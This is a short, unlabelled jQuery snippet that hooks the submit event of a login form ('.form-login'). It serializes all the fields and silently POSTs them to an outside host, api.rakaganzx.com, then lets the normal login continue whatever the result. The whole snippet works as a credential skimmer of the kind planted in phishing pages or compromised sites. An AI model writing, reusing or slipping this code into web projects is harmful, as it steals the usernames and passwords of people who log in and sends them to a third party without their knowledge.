$(".form-login").submit(function() {
    var d = $(".form-login");

    $.ajax({
        url: "http://api.rakaganzx.com",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});